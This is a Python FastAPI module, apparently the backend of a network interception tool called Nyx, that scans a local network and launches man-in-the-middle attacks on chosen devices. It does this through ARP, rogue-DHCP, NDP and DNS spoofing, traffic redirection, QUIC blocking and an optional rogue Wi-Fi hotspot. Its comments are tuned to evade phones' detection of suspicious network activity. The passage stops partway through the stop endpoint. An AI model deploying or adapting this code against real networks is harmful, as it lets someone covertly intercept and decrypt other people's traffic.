import asyncio
import ipaddress as _ipaddress
import logging
import os
import platform
import subprocess
import time
from datetime import datetime, timezone

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from core.proxy.engine import (
    ProxyEngine,
    setup_transparent_redirect,
    start_transparent_transport,
    stop_transparent_transport,
    windivert_last_error,
    windivert_forwarded_count,
    windivert_last_forwarded,
    dhcp_block_add,
    dhcp_block_clear,
    quic_block_set_targets,
    quic_block_clear,
    quic_dropped_count,
    TRANSPARENT_PORT,
)
from modules.arp_spoof import ARPSpoofer, _get_local_ip, _get_mac, _get_hostname
from modules.dns_spoof import DNSSpoofer
from modules.dhcp_spoof import DHCPSpoofer, detect_subnet_mask
from modules.ndp_spoof import NDPSpoofer, is_ipv6
from modules.vendor_lookup import lookup_vendor_async
from modules.ca_portal import DEFAULT_PORT as CA_PORTAL_PORT

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/mitm", tags=["mitm"])

_engine: ProxyEngine | None = None
_spoofer: ARPSpoofer | None = None
_ndp_spoofer: NDPSpoofer | None = None
_dhcp_spoofer: DHCPSpoofer | None = None
_dns_spoofer: DNSSpoofer | None = None
_dns_spoof_error: str | None = None
_redirect_active = False
_wifi_ap_manager = None
# Serializes /start requests: the UI can double-fire, and a second start
# while the first is still switching the proxy to transparent mode used to
# race the engine and kill the freshly restarted proxy (bind 8080 conflict).
_mitm_start_lock = asyncio.Lock()

# "auto" mode: DHCP first (stealth — no "suspicious activity" alert), with an
# automatic ARP fallback when DHCP clearly is not converting. Two triggers:
#  - no DISCOVER at all within the grace period (the target never reconnects
#    and never asks for a lease) -> ARP;
#  - OFFER sent but the target never requested the lease from us within a
#    shorter window (the real router won the OFFER race) -> ARP.
# Once the target requests the lease from us, DHCP converted and ARP is not
# started (the target legitimately routes through Nyx).
_DHCP_FALLBACK_GRACE_NO_DISCOVER: float = 20.0
_DHCP_FALLBACK_GRACE_RACE_LOST: float = 10.0
_dhcp_fallback_task: asyncio.Task | None = None
_dhcp_started_ts: float | None = None
# Background tasks (e.g. async target-MAC resolution) kept alive by reference.
_bg_tasks: set[asyncio.Task] = set()


def init_mitm(engine: ProxyEngine):
    global _engine
    _engine = engine
    # Open the proxy port in Windows Firewall on boot so a phone/tablet using
    # the manual proxy (Stealth Mode) is never silently dropped. The rule is
    # kept for the whole backend lifetime — it is only removed at shutdown —
    # because a manual-proxy device must be able to reach Nyx regardless of
    # whether ARP/DNS interception is currently running.
    if engine is not None:
        _ensure_windows_firewall(engine.port)
        _ensure_windows_firewall(TRANSPARENT_PORT)


async def shutdown_mitm():
    """Release MITM resources at backend shutdown (firewall rules, redirects)."""
    global _spoofer, _dns_spoofer, _redirect_active, _dns_spoof_error, _ndp_spoofer, _dhcp_spoofer
    global _dhcp_fallback_task, _dhcp_started_ts, _wifi_ap_manager
    _dns_spoof_error = None

    if _wifi_ap_manager is not None:
        try:
            await _wifi_ap_manager.stop()
        except Exception as e:
            logger.warning("WiFi AP stop on shutdown failed: %s", e)
        _wifi_ap_manager = None

    if _dhcp_fallback_task:
        _dhcp_fallback_task.cancel()
        try:
            await _dhcp_fallback_task
        except (asyncio.CancelledError, Exception):
            pass
        _dhcp_fallback_task = None
    _dhcp_started_ts = None
    dhcp_block_clear()
    quic_block_clear()
    if _dns_spoofer:
        await _dns_spoofer.stop()
        _dns_spoofer = None
    if _ndp_spoofer:
        await _ndp_spoofer.stop()
        _ndp_spoofer = None
    if _dhcp_spoofer:
        await _dhcp_spoofer.stop()
        _dhcp_spoofer = None
    if _spoofer:
        await _spoofer.stop()
        _spoofer = None
    if _redirect_active and _engine is not None:
        _exec_admin_redirect(TRANSPARENT_PORT, enable=False)
        _redirect_active = False
    if _engine:
        _remove_windows_firewall(_engine.port)
        _remove_windows_firewall(TRANSPARENT_PORT)
        _remove_windows_firewall(67, protocol="UDP", rule_prefix="Nyx DHCP")
    logger.info("MITM resources released")


def _is_admin() -> bool:
    try:
        if platform.system().lower() == "windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception as e:
        logger.warning("Failed to check admin status: %s", e)
        return False


def _ensure_windows_firewall(port: int, protocol: str = "TCP", rule_prefix: str = "Nyx Proxy") -> bool:
    """Open a port for LAN devices if Windows Firewall would block it.

    Windows Firewall silently drops inbound connections on public/private
    profiles to ports that aren't explicitly allowed — the #1 reason a phone
    on the same Wi-Fi "sees" the proxy but nothing is ever intercepted.
    """
    if platform.system().lower() != "windows":
        return True
    rule_name = f"{rule_prefix} {protocol} {port}"
    try:
        check = subprocess.run(
            ["netsh", "advfirewall", "firewall", "show", "rule", f"name={rule_name}"],
            capture_output=True, text=True, timeout=20,
        )
        # Rule may not exist — query by name only finds it if present.
        if f"Rule Name:\n{rule_name}".replace("\0", "") in check.stdout or rule_name in check.stdout:
            logger.info("Firewall rule '%s' already present", rule_name)
            return True
        result = subprocess.run(
            [
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={rule_name}",
                "dir=in", "action=allow", "protocol=" + protocol, f"localport={port}",
                "profile=any", "enable=yes",
            ],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            logger.info("Added firewall rule '%s' (port %d)", rule_name, port)
            return True
        logger.warning("Firewall rule failed (rc=%d): %s", result.returncode, result.stderr.strip()[:200])
        return False
    except Exception as e:
        logger.warning("Firewall rule error: %s", e)
        return False


def _remove_windows_firewall(proxy_port: int, protocol: str = "TCP", rule_prefix: str = "Nyx Proxy"):
    if platform.system().lower() != "windows":
        return
    rule_name = f"{rule_prefix} {protocol} {proxy_port}"
    try:
        subprocess.run(
            ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
            capture_output=True, text=True, timeout=20,
        )
        logger.info("Removed firewall rule '%s'", rule_name)
    except Exception as e:
        logger.warning("Firewall rule removal error: %s", e)


def _exec_admin_redirect(proxy_port: int, enable: bool) -> list[str]:
    cmds = setup_transparent_redirect(proxy_port, enable)
    if not _is_admin():
        return cmds
    executed = []
    for cmd in cmds:
        try:
            sys_platform = platform.system().lower()
            if sys_platform == "linux" and (cmd.startswith("iptables") or cmd.startswith("sysctl")):
                subprocess.run(cmd.split(), check=True, capture_output=True)
                executed.append(cmd)
            elif sys_platform == "darwin":
                _exec_darwin_redirect(cmd)
                executed.append(cmd)
        except subprocess.CalledProcessError as e:
            logger.warning("Redirect command failed (may already be set): %s -> %s", cmd, e)
    return executed


def _exec_darwin_redirect(cmd: str) -> None:
    """Execute a macOS redirect command without shell=True.

    The old code used ``shell=True`` for pipe commands like
    ``echo 'rule' | pfctl -ef -``. We now pipe the rule text directly into
    pfctl's stdin via subprocess, which is both injection-safe and shell-free.
    """
    if "|" in cmd:
        # Pipe command: decompose into left (echo/producer) and right (consumer)
        left_str, right_str = cmd.split("|", 1)
        left_str = left_str.strip()
        right_str = right_str.strip()
        if left_str.startswith("echo "):
            # ``echo 'rule text'`` → extract the rule and feed it to pfctl stdin
            rule_text = left_str[5:].strip("\"'")
            subprocess.run(
                right_str.split(), input=rule_text.encode(),
                check=True, capture_output=True,
            )
        else:
            p1 = subprocess.run(left_str.split(), capture_output=True, check=True)
            subprocess.run(right_str.split(), input=p1.stdout, check=True, capture_output=True)
    else:
        subprocess.run(cmd.split(), check=True, capture_output=True)


def _probe_one_target(ip: str, timeout: float = 1.0) -> str | None:
    """Probe a single target; returns the IP if it did NOT respond."""
    try:
        if is_ipv6(ip):
            # IPv6: ICMPv6 echo via scapy (Neighbor Solicitation is
            # already handled by the NDP spoofer at runtime).
            from scapy.all import ICMPv6EchoRequest, IPv6, sr1
            clean = ip.split("%")[0]
            reply = sr1(IPv6(dst=clean) / ICMPv6EchoRequest(), timeout=timeout, verbose=0)
            return ip if reply is None else None
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=0)
        return ip if not ans else None
    except Exception as e:
        logger.debug("Reachability probe failed for %s: %s", ip, e)
        return ip


async def _probe_target_reachability(target_ips: list[str]) -> list[str]:
    """Best-effort client-isolation check (AP isolation / client isolation).

    Probes each target in PARALLEL with ARP who-has (IPv4) or ICMPv6 echo
    (IPv6); if a target answers none of the probes it may be isolated from us
    by the AP — which would make ARP/NDP spoofing useless. Returns the list
    of targets that did NOT respond. False positives are possible (sleeping
    device, firewall dropping probes), hence the result is surfaced as a
    warning, not a hard failure.
    """
    results = await asyncio.gather(
        *(asyncio.to_thread(_probe_one_target, ip) for ip in target_ips)
    )
    return [ip for ip in results if ip]


class MITMStartRequest(BaseModel):
    target_ips: list[str]
    gateway_ip: str | None = None
    # DNS spoofing is OFF by default: with ARP/DHCP transparent interception
    # the target's traffic already flows through the proxy, and resolving
    # domains to Nyx's own IP can blackhole the target (that traffic is
    # destined to the local host and bypasses the transparent capture).
    enable_dns_spoof: bool = False
    enable_ndp_spoof: bool = True
    spoof_gateway_cache: bool = False
    # "auto" prefers DHCP spoofing (stealthy, no "suspicious network" alert)
    # and falls back to ARP; "arp"/"dhcp" force a specific method.
    spoof_method: str = "auto"
    # "active" = periodic ARP flooding (detected by Samsung/Android);
    # "reactive" = answer only when the target asks (stealth, best with
    # modern phones). Defaults to reactive for target-only poisoning.
    arp_mode: str = "reactive"
    # "wifi-ap" turns the machine into a rogue access point: the target
    # connects to us and we ARE the gateway — zero spoofing, zero detection.
    enable_wifi_ap: bool = False
    wifi_ap_ssid: str = "Nyx"
    wifi_ap_passphrase: str = "nyxmitm2026"


class MITMStartResponse(BaseModel):
    status: str
    message: str
    admin_mode: bool


class MITMStopResponse(BaseModel):
    status: str
    message: str


class NetworkDevice(BaseModel):
    ip: str
    mac: str | None = None
    hostname: str | None = None
    vendor: str | None = None
    is_local: bool = False


async def _lookup_vendor(mac: str, hostname: str | None = None) -> str | None:
    """Delegate to the vendor_lookup module (dynamic, cached, no static list)."""
    return await lookup_vendor_async(mac, hostname)


async def _start_dhcp_spoofing(real_gateway_ip: str | None, target_ips: list[str] | None = None) -> DHCPSpoofer | None:
    """Start the rogue DHCP server that assigns Nyx as the client's gateway.

    DHCP spoofing avoids the "suspicious network activity" alert entirely:
    the target legitimately uses Nyx's MAC as its gateway (no forged ARP),
    so the gateway MAC never appears to conflict. Returns the spoofer when
    UDP/67 could be bound, else None.

    ``target_ips`` are resolved to MACs asynchronously: only those devices are
    ever DHCPNAKed (the "kick" that forces a renewing phone back to a fresh
    DISCOVER) — other devices' renewals are left untouched.
    """
    local_ip = _get_local_ip()
    if not local_ip or local_ip == "127.0.0.1":
        logger.warning("No LAN IP detected — cannot run DHCP spoofing")
        return None
    # DNS must point at the REAL router (or a public resolver) — pointing it
    # at Nyx's own IP would blackhole DNS since Nyx does not serve DNS on 53.
    dns_ip = real_gateway_ip or await asyncio.to_thread(ARPSpoofer._detect_gateway) or "8.8.8.8"
    # detect_subnet_mask runs subprocesses (ipconfig/ip/ifconfig) — off the
    # event loop so the /start request doesn't stall on it.
    mask = await asyncio.to_thread(detect_subnet_mask, local_ip)
    # Windows Firewall may silently drop the target's DISCOVER (inbound UDP
    # broadcast to 67) — without a rule the rogue server never sees a request.
    if platform.system().lower() == "windows":
        _ensure_windows_firewall(67, protocol="UDP", rule_prefix="Nyx DHCP")
    target_macs: set[str] = set()
    if target_ips:

        async def _fill_target_macs():
            for ip in target_ips:
                mac = await asyncio.to_thread(_get_mac, ip)
                if mac:
                    target_macs.add(mac)
                    logger.info("DHCP NAK scope: target %s is %s", ip, mac)

        task = asyncio.create_task(_fill_target_macs())
        _bg_tasks.add(task)
        task.add_done_callback(_bg_tasks.discard)
    spoofer = DHCPSpoofer(
        gateway_ip=local_ip,
        dns_ip=dns_ip,
        subnet_mask=mask,
        # SHORT lease on purpose: T1 renewal fires at half the lease, so after
        # Nyx stops the target renegotiates with the real router within ~2.5
        # minutes instead of blackholing for half of a 24h default lease. The
        # post-stop heal responder (DHCPNAK on renewal) recovers it even faster.
        lease_seconds=300,
        target_macs=target_macs,
    )
    try:
        ok = await spoofer.start()
    except Exception as e:
        logger.error("DHCP spoofing start error: %s", e)
        return None
    return spoofer if ok else None


async def _make_arp_spoofer(target_v4: list[str], req: MITMStartRequest) -> ARPSpoofer:
    """Start (and return) the ARP spoofer for the given IPv4 targets.

    ``req.arp_mode`` selects active (periodic flood) or reactive (answer-only,
    stealth) poisoning. Reactive is the default because modern Samsung /
    Android devices flag the periodic unsolicited flood.
    """
    spoofer = ARPSpoofer(
        target_ips=target_v4,
        gateway_ip=req.gateway_ip,
        spoof_gateway_cache=req.spoof_gateway_cache,
        mode=req.arp_mode,
    )
    await spoofer.start()
    return spoofer


async def _dhcp_fallback_watcher(
    dhcp_spoofer: DHCPSpoofer,
    target_v4: list[str],
    req: MITMStartRequest,
    grace_no_discover: float = _DHCP_FALLBACK_GRACE_NO_DISCOVER,
    grace_race_lost: float = _DHCP_FALLBACK_GRACE_RACE_LOST,
    tick: float = 1.0,
):
    """'auto' mode: watch the rogue DHCP server and start ARP when DHCP is
    clearly not converting.

    - target requested the lease FROM us -> DHCP converted, stay stealthy
      (return; the watcher is cancelled at MITM stop).
    - no DISCOVER within ``grace_no_discover`` -> ARP fallback.
    - OFFER(s) sent but no lease requested within ``grace_race_lost`` ->
      the real router won the OFFER race -> ARP fallback.

    Once ARP is running the watcher keeps running (cheaply) to follow leases
    granted later: the target's NEW address is added to the ARP target list.
    """
    global _spoofer
    started = time.time()
    while True:
        await asyncio.sleep(tick)
        if _spoofer is not None:
            for lease in dhcp_spoofer.granted_leases:
                _spoofer.add_target(lease["ip"])
            continue
        if dhcp_spoofer.lease_requests > 0:
            logger.info(
                "DHCP lease accepted by target (server_id=us) — staying DHCP-only "
                "(stealth, no ARP needed)"
            )
            return
        elapsed = time.time() - started
        if dhcp_spoofer.offers_sent == 0 and elapsed >= grace_no_discover:
            reason = f"no DISCOVER received within {grace_no_discover:.0f}s"
        elif dhcp_spoofer.offers_sent > 0 and elapsed >= grace_race_lost:
            reason = f"OFFER sent but no lease request within {grace_race_lost:.0f}s (router won the race)"
        else:
            continue
        logger.info("DHCP did not convert (%s) — starting ARP fallback", reason)
        try:
            spoofer = await _make_arp_spoofer(target_v4, req)
        except Exception as e:
            logger.error("ARP fallback failed to start: %s", e)
            return
        _spoofer = spoofer
        for ip in target_v4:
            dhcp_block_add(ip)
        for lease in dhcp_spoofer.granted_leases:
            spoofer.add_target(lease["ip"])
        logger.info("ARP fallback active against %s", target_v4)


@router.get("/scan-network", response_model=list[NetworkDevice])
async def scan_network():
    """Scan the local subnet for active devices using two-pass ARP."""
    local_ip = _get_local_ip()

    if local_ip == "127.0.0.1":
        network = _ipaddress.IPv4Network("192.168.1.0/24", strict=False)
    else:
        network = _ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    logger.info("Scanning network %s (local IP: %s)...", network, local_ip)

    hosts = [str(ip) for ip in network.hosts()]
    results: dict[str, NetworkDevice | None] = {}

    async def fast_probe_sem(ip: str, sem: asyncio.Semaphore):
        async with sem:
            mac = await asyncio.to_thread(lambda: _get_mac(ip, timeout=0.5))
            if mac is None:
                results[ip] = None
                return
            hostname = await asyncio.to_thread(lambda: _get_hostname(ip))
            vendor = await _lookup_vendor(mac, hostname)
            results[ip] = NetworkDevice(
                ip=ip, mac=mac, hostname=hostname, vendor=vendor, is_local=(ip == local_ip),
            )

    async def slow_probe_sem(ip: str, sem: asyncio.Semaphore):
        async with sem:
            mac = await asyncio.to_thread(lambda: _get_mac(ip, timeout=1.5))
            if mac is None:
                return
            hostname = await asyncio.to_thread(lambda: _get_hostname(ip))
            vendor = await _lookup_vendor(mac, hostname)
            results[ip] = NetworkDevice(
                ip=ip, mac=mac, hostname=hostname, vendor=vendor, is_local=(ip == local_ip),
            )

    fast_sem = asyncio.Semaphore(60)
    await asyncio.gather(*[fast_probe_sem(ip, fast_sem) for ip in hosts])
    logger.info("Pass 1 complete, %d found, probing remaining %d...",
                sum(1 for v in results.values() if v is not None),
                sum(1 for v in results.values() if v is None))

    slow_ips = [ip for ip, v in results.items() if v is None]
    if slow_ips:
        slow_sem = asyncio.Semaphore(20)
        await asyncio.gather(*[slow_probe_sem(ip, slow_sem) for ip in slow_ips])

    devices = [d for d in results.values() if d is not None]
    devices.sort(key=lambda d: (d.is_local, [int(o) for o in d.ip.split(".")]))

    logger.info("Found %d active devices on %s (pass 1 + pass 2)", len(devices), network)
    return devices


@router.post("/start", response_model=MITMStartResponse)
async def mitm_start(req: MITMStartRequest):
    global _spoofer, _dns_spoofer, _redirect_active, _dns_spoof_error, _ndp_spoofer, _dhcp_spoofer
    _dns_spoof_error = None

    # `async with` already serialises concurrent starts; no racy pre-check.
    async with _mitm_start_lock:
        return await _mitm_start_locked(req)


async def _mitm_start_locked(req: MITMStartRequest):
    global _spoofer, _dns_spoofer, _redirect_active, _dns_spoof_error, _ndp_spoofer, _dhcp_spoofer, _wifi_ap_manager
    global _dhcp_started_ts

    if _engine is None:
        raise HTTPException(status_code=500, detail="Proxy engine not initialized")

    # Fresh TLS-failure tracking and activity monitor per interception session.
    _engine.reset_tls_failures()
    _engine.reset_activity()

    if _spoofer is not None or _dns_spoofer is not None or _ndp_spoofer is not None or _dhcp_spoofer is not None:
        raise HTTPException(status_code=409, detail="MITM already active, stop first")

    if not req.target_ips:
        raise HTTPException(status_code=400, detail="At least one target IP is required")

    warnings: list[str] = []

    admin = _is_admin()
    if not admin:
        logger.warning("Not running as admin — ARP spoofing and port redirect will fail. Run Nyx as administrator.")
    else:
        logger.info("Running with admin privileges")

    if _engine.mode != "transparent":
        # switch_to_transparent() stops/restarts the proxy and busy-waits on
        # the proxy thread — run it off the event loop so the API/UI does not
        # freeze for seconds during MITM start.
        ok, msg = await asyncio.to_thread(_engine.switch_to_transparent)
        if not ok:
            logger.error("Failed to switch to transparent mode: %s", msg)
            raise HTTPException(500, detail=f"Failed to switch proxy to transparent mode: {msg}")

    _redirect_active = False
    if platform.system().lower() == "windows":
        # WinDivert handles port redirection on Windows. Start it (and IP
        # forwarding) explicitly on EVERY start: after a previous MITM stop
        # the transport is torn down, so the engine's startup-time flag is
        # stale and must not be trusted. Without a working transport, ARP/DNS
        # spoofing would redirect the target's traffic to this machine and
        # then drop it (nobody listens on 80/443) — a silent blackhole that
        # looks like "Nyx is blocking the internet". So we refuse to start
        # spoofing when the transparent transport is not available.
        transport_ready = start_transparent_transport(TRANSPARENT_PORT)
        _engine.transport_ready = transport_ready
        if not transport_ready:
            logger.warning(
                "WinDivert transparent transport NOT ready — refusing to start "
                "spoofing (would blackhole targets)."
            )
            # Surface the REAL failure cause (e.g. port 8080 in use by
            # another instance, a leftover WinDivert API on 8085) instead of
            # the generic WinDivert guess.
            real_cause = getattr(_engine, "_start_error", None) or windivert_last_error()
            if real_cause:
                raise HTTPException(
                    status_code=400,
                    detail=(
                        f"{real_cause} Spoofing is disabled to avoid blocking "
                        "the target's internet. Close the other Nyx instance "
                        "and retry, or use Stealth Mode (manual proxy on the "
                        "target)."
                    ),
                )
            raise HTTPException(
                status_code=400,
                detail=(
                    "Transparent transport not ready (WinDivert requires "
                    "Administrator privileges, or failed to start). Spoofing is "
                    "disabled to avoid blocking the target's internet. Launch "
                    "Nyx as Administrator, or use Stealth Mode (manual proxy on "
                    "the target) which does NOT need WinDivert."
                ),
            )
        _redirect_active = True
        logger.info("WinDivert transparent transport ready — port redirection active")
        firewall_ok = False
        for p in {_engine.port, TRANSPARENT_PORT}:
            if _ensure_windows_firewall(p):
                firewall_ok = True
        if not firewall_ok:
            warnings.append(
                "Could not add Windows Firewall rule for the proxy port — "
                "the target device may not reach the proxy. Launch Nyx as "
                "Administrator or allow the port manually."
            )
    else:
        cmds = _exec_admin_redirect(TRANSPARENT_PORT, enable=True)
        if not cmds:
            # Same blackhole protection as Windows: if iptables (Linux) or
            # pfctl (macOS) failed to set up the port redirection, ARP/DNS
            # spoofing would redirect the target's traffic to this machine
            # and then drop it — a silent blackhole that looks like "Nyx is
            # blocking the internet". Refuse to start spoofing instead.
            sys_platform = platform.system().lower()
            logger.warning(
                "Port redirect setup failed on %s — refusing to start spoofing "
                "(would blackhole targets).",
                sys_platform,
            )
            raise HTTPException(
                status_code=400,
                detail=(
                    "Port redirection could not be set up (requires root on "
                    "Linux/macOS, or iptables/pfctl failed). Spoofing is "
                    "disabled to avoid blocking the target's internet. Run "
                    "Nyx as root/Administrator, or use Stealth Mode (manual "
                    "proxy on the target) which does NOT need port redirect."
                ),
            )
        logger.info("Port redirection commands executed: %s", cmds)
        _redirect_active = True

    target_v4 = [ip for ip in req.target_ips if not is_ipv6(ip)]
    target_v6 = [ip for ip in req.target_ips if is_ipv6(ip)]

    # Point 4 — client/AP isolation probe: if a target doesn't answer ARP
    # (and ICMP), the router may have client isolation enabled, which would
    # make ARP/NDP spoofing useless. Report it early instead of silently
    # failing. Best-effort only: a sleeping device or a reachable-but-muted
    # host can produce false positives.
    unreachable_targets: list[str] = []
    probe_ips = target_v4 + [ip.split("%")[0] for ip in target_v6]
    if probe_ips:
        try:
            unreachable_targets = await asyncio.wait_for(
                _probe_target_reachability(probe_ips),
                timeout=max(4.0, len(probe_ips) + 2.0),
            )
        except asyncio.TimeoutError:
            logger.warning("AP isolation probe timed out — skipping check")
        except Exception as e:
            logger.debug("AP isolation probe failed: %s", e)
    if unreachable_targets:
        warnings.append(
            "Target(s) %s did not respond to ARP/ICMP — the AP may have "
            "client isolation enabled, which would break ARP-based spoofing "
            "(DHCP spoofing is unaffected). Check the router settings."
            % ", ".join(unreachable_targets)
        )

    # ── WiFi AP mode (rogue access point) ──────────────────────────────
    # The ultimate bypass: the target connects to OUR SSID, we ARE the
    # gateway/DHCP, so no ARP/NDP/DHCP spoofing is needed — nothing for
    # Android/Samsung to detect. Optional, requires driver support.
    wifi_ap_manager = None
    if req.enable_wifi_ap:
        try:
            from modules.wifi_ap import WiFiAPManager, is_supported
            support = is_supported()
            if not support.get("supported"):
                warnings.append(f"WiFi AP mode unavailable: {support.get('reason')}")
            else:
                wifi_ap_manager = WiFiAPManager(
                    ssid=req.wifi_ap_ssid or "Nyx",
                    passphrase=req.wifi_ap_passphrase or "nyxmitm2026",
                )
                ap_result = await wifi_ap_manager.start()
                warnings.append(
                    f"WiFi AP active: connect the target to SSID "
                    f"'{req.wifi_ap_ssid or 'Nyx'}' (pass: {req.wifi_ap_passphrase or 'nyxmitm2026'}). "
                    f"{ap_result.get('note', '')}"
                )
                _wifi_ap_manager = wifi_ap_manager
        except Exception as e:
            warnings.append(f"WiFi AP mode failed: {e}")

    local_ip = _get_local_ip()
    spoofer = None
    dhcp_spoofer = None
    spoof_method = (req.spoof_method or "auto").lower()
    if spoof_method not in ("auto", "arp", "dhcp"):
        spoof_method = "auto"

    if target_v4:
        # "auto" prefers DHCP (stealthy, no "suspicious network" alert on
        # Android/iOS) and falls back to ARP automatically when DHCP clearly
        # is not converting (no DISCOVER, or the router won the OFFER race).
        use_dhcp = spoof_method != "arp"
        if use_dhcp:
            dhcp_spoofer = await _start_dhcp_spoofing(req.gateway_ip, target_v4)
            if dhcp_spoofer is None:
                if spoof_method == "dhcp":
                    raise HTTPException(
                        status_code=400,
                        detail=(
                            "DHCP spoofing could not start (UDP/67 requires "
                            "Administrator privileges and must be free). Run "
                            "Nyx as Administrator and retry."
                        ),
                    )
                warnings.append(
                    "DHCP spoofing could not start — falling back to ARP "
                    "spoofing (may trigger a 'suspicious network' alert on the target)."
                )
                use_dhcp = False
            else:
                _dhcp_spoofer = dhcp_spoofer
                _dhcp_started_ts = time.time()
                if spoof_method == "auto":
                    warnings.append(
                        "Auto mode: trying DHCP first (stealth — no 'suspicious "
                        "activity' alert). If the target does not request a "
                        "lease within ~20s, Nyx falls back to ARP automatically."
                    )
                else:
                    warnings.append(
                        "DHCP mode: the target must reconnect to Wi-Fi once to "
                        "receive the rogue lease (no other setup needed)."
                    )

        # ARP spoofing is UNIDIRECTIONAL (target-only) by default: we poison
        # only the target's ARP cache (gateway IP -> Nyx MAC), so traffic
        # flows target -> Nyx -> gateway while the gateway's own cache is
        # left untouched. Poisoning the gateway cache too (bidirectional)
        # is what routers and phones detect as "suspicious network activity"
        # and can get Nyx quarantined — and it is never needed for
        # interception. It is only offered as an explicit opt-in.
        if req.spoof_gateway_cache:
            warnings.append(
                "Gateway-cache spoofing (bidirectional) is enabled by the "
                "user — this is more detectable and can get Nyx quarantined "
                "by the router."
            )

        if not use_dhcp:
            # Explicit ARP mode, or DHCP failed to bind (auto). ARP starts
            # immediately — interception is guaranteed for already-connected
            # devices.
            try:
                spoofer = await _make_arp_spoofer(target_v4, req)
                _spoofer = spoofer
            except Exception as e:
                logger.error("ARP spoofing failed to start: %s", e)
                _spoofer = None
                raise HTTPException(500, detail=f"ARP spoofing failed: {e}")
            for ip in target_v4:
                dhcp_block_add(ip)
            # DHCP running alongside ARP: renewals are dropped (dhcp_block)
            # and NAKed so a reconnect still converts to the clean DHCP path.
        elif spoof_method == "auto":
            # DHCP is up and this is auto: ARP kicks in automatically if DHCP
            # does not convert within the grace periods (see
            # _dhcp_fallback_watcher).
            global _dhcp_fallback_task
            _dhcp_fallback_task = asyncio.create_task(
                _dhcp_fallback_watcher(dhcp_spoofer, target_v4, req)
            )

    if target_v6:
        ndp_spoofer = NDPSpoofer(target_ips=target_v6)
        try:
            await ndp_spoofer.start()
            _ndp_spoofer = ndp_spoofer
        except Exception as e:
            logger.error("NDP spoofing failed to start: %s", e)
            _ndp_spoofer = None
            raise HTTPException(500, detail=f"NDP spoofing failed: {e}")
        warnings.append(
            "IPv6 targets are forwarded but not decrypted — the transparent "
            "proxy currently intercepts IPv4 only (IPv6 traffic is relayed, not blackholed)."
        )
    elif req.enable_ndp_spoof:
        # NDP only matters on IPv6 networks; no target is IPv6, so nothing to do.
        pass

    dns_active = False
    if req.enable_dns_spoof:
        # spoof_ip must be OUR local IP so targets resolve domains to us.
        # NOTE: resolving to Nyx's own IP routes the target's traffic at the
        # local host, which bypasses the transparent capture on some platforms
        # — hence it is OFF by default and warned about when forced.
        _dns_spoofer = DNSSpoofer(spoof_ip=local_ip, target_ips=target_v4 or target_v6)
        try:
            await _dns_spoofer.start()
            dns_active = True
            warnings.append(
                "DNS spoofing resolves domains to Nyx's IP — ensure the "
                "transparent proxy captures locally-destined traffic, or the "
                "target will lose connectivity."
            )
            logger.info("DNS spoofing active: queries from %s -> %s", req.target_ips, local_ip)
        except Exception as e:
            logger.error("DNS spoofing failed to start: %s", e)
            _dns_spoofer = None
            _dns_spoof_error = str(e)
            warnings.append("DNS spoofing failed to start.")

    if not admin:
        warnings.append("Not running as administrator. Spoofing (ARP/DHCP/NDP) and port redirection require admin rights.")
    if not _redirect_active:
        warnings.append("Port redirection not active. Traffic on port 80/443 will not reach the proxy.")

    targets_str = ", ".join(req.target_ips)
    spoof_desc: list[str] = []
    # QUIC/HTTP3 block: drop the targets' UDP/443 so QUIC-capable clients
    # fall back to interceptable TCP/TLS instead of bypassing the proxy.
    quic_block_set_targets(set(req.target_ips))
    if _dhcp_spoofer is not None:
        spoof_desc.append(f"DHCP spoofing (Nyx as gateway {local_ip}) <- {target_v4 or '(no IPv4 targets)'}")
        # Audit trail
        from core.audit import log_audit
        log_audit(
            action="mitm.dhcp_started",
            target=",".join(target_v4),
            detail=f"DHCP rogue server on {local_ip}",
        )
    if spoofer is not None:
        spoof_desc.append(f"ARP spoofing {spoofer.gateway_ip} <-> {target_v4 or '(no IPv4 targets)'}")
    if _ndp_spoofer is not None:
        spoof_desc.append(f"NDP spoofing {_ndp_spoofer.gateway_ip6 or 'gw?'} <-> {target_v6 or '(no IPv6 targets)'}")
    # Point at the CA portal (bound to 0.0.0.0) so LAN targets can actually
    # reach the install page — the main API binds to 127.0.0.1 and is not
    # reachable from the target device. The portal itself is started at
    # backend startup (always reachable): targets install/remove the CA
    # out-of-band (scan the QR / open the URL from the target device).
    ca_portal_url = f"http://{local_ip}:{CA_PORTAL_PORT}/" if local_ip and local_ip != "127.0.0.1" else ""

    # Prometheus metrics
    from core.metrics import registry as _metrics
    _metrics.inc("mitm_sessions_started_total")
    _metrics.set("mitm_sessions_active", 1)
    if spoofer is not None:
        _metrics.inc("mitm_arp_spoofs_total")
        _metrics.set("mitm_arp_targets", len(target_v4))
    if _dhcp_spoofer is not None:
        _metrics.inc("mitm_dhcp_spoofs_total")
        _metrics.set("mitm_dhcp_targets", len(target_v4))
    if _ndp_spoofer is not None:
        _metrics.inc("mitm_ndp_spoofs_total")

    return MITMStartResponse(
        status="ok",
        message=(
            f"MITM active against {len(req.target_ips)} target(s): {targets_str}. "
            f"{' | '.join(spoof_desc)}. "
            f"{'DNS spoofing active.' if dns_active else ''} "
            f"{'Warnings: ' + '; '.join(warnings) if warnings else ''}"
        ),
        admin_mode=admin,
    )


@router.post("/stop", response_model=MITMStopResponse)
async def mitm_stop():
    global _spoofer, _dns_spoofer, _redirect_active, _dns_spoof_error, _ndp_spoofer, _dhcp_spoofer, _wifi_ap_manager
    global _dhcp_fallback_task, _dhcp_started_ts
    _dns_spoof_error = None

    # Tear down the rogue access point if it was started.
    if _wifi_ap_manager is not None:
        try:
            await _wifi_ap_manager.stop()
        except Exception as e:
            logger.warning("WiFi AP stop failed: %s", e)
        _wifi_ap_manager = None

    if _dhcp_fallback_task:
        _dhcp_fallback_task.cancel()
        try:
            await _dhcp_fallback_task
        except (asyncio.CancelledError, Exception):
            pass
        _dhcp_fallback_task = None
    _dhcp_started_ts = None
    dhcp_block_clear()

    if _dns_spoofer:
        await _dns_spoofer.stop()
        _dns_spoofer = None

    if _ndp_spoofer:
        await _ndp_spoofer.stop()
        _ndp_spoofer = None

